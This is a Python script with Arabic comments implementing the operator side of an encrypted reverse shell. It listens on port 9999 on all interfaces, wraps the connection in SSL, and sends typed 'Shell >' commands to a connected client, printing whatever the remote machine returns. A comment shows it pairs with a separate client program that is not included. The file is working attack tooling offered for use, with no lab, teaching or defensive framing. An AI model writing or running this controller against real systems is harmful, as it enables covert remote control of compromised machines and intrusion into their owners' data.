import socket
import ssl  # استيراد مكتبة SSL لتشفير الاتصال

# إعدادات السيرفر
HOST = '0.0.0.0'  # الاستماع على كل الواجهات
PORT = 9999       # نفس البورت الذي يستخدمه الكلاينت

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        server.bind((HOST, PORT))
        server.listen(1)
        print(f"[+] Listening on {HOST}:{PORT}...")
    except socket.error as e:
        print(f"[!] Socket error: {e}")
        return

    client_socket, client_address = server.accept()
    print(f"[+] Connection established with {client_address[0]}:{client_address[1]}")

    # **تطبيق SSL/TLS** على الاتصال
    client_socket = ssl.wrap_socket(client_socket, keyfile="server.key", certfile="server.crt", server_side=True)

    while True:
        try:
            command = input("Shell > ")
            if not command.strip():
                continue

            client_socket.send(command.encode())

            if command.lower() == 'quit' or command.lower() == 'exit':
                print("[*] Closing connection.")
                break

            result = client_socket.recv(4096).decode()
            print(result)

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user. Closing connection.")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            break

    client_socket.close()
    server.close()

if __name__ == '__main__':
    start_server()
